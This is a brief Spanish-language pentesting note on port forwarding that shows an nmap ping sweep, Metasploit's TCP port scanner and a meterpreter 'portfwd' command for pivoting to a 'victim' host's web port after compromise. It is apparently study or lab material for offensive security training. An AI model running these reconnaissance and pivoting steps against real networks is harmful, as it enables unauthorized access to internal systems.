 Es una técnica utilizada en redes de computadoras para redirigir una solicitud de comunicación de un puerto específico en una dirección [[IP]] a otro puerto o dirección IP. Esta técnica se utiliza comúnmente en redes privadas para permitir que dispositivos externos se comuniquen con dispositivos internos a través de un router.

----

## [[Metasploit]]

Una vez que se tiene routeado el activo es necesario que podamos intentar reconocer los activos de la interfaz de red de la siguiente forma con [[nmap]]

```
nmap -sn 192.168.100.0/24
```

En caso no funcione probar con la enumeración en una línea o con un escaner de puertos del propio metasploit:

```
use scanner/portscan/tcp

set RHOSTS 192.168.100.21
```

Luego de verificar los servicios corriendo en el host víctima y con una shell meterpreter podremos realizar el portforwarding:

```
portfwd add -l 8080 -p 80 -r 192.168.100.21
```

- Siendo 8080 el puerto en el cual nosotros redirecciones el tráfico de manera local
- Siendo 80 el puerto de la máquina víctima el cual queremos redireccionar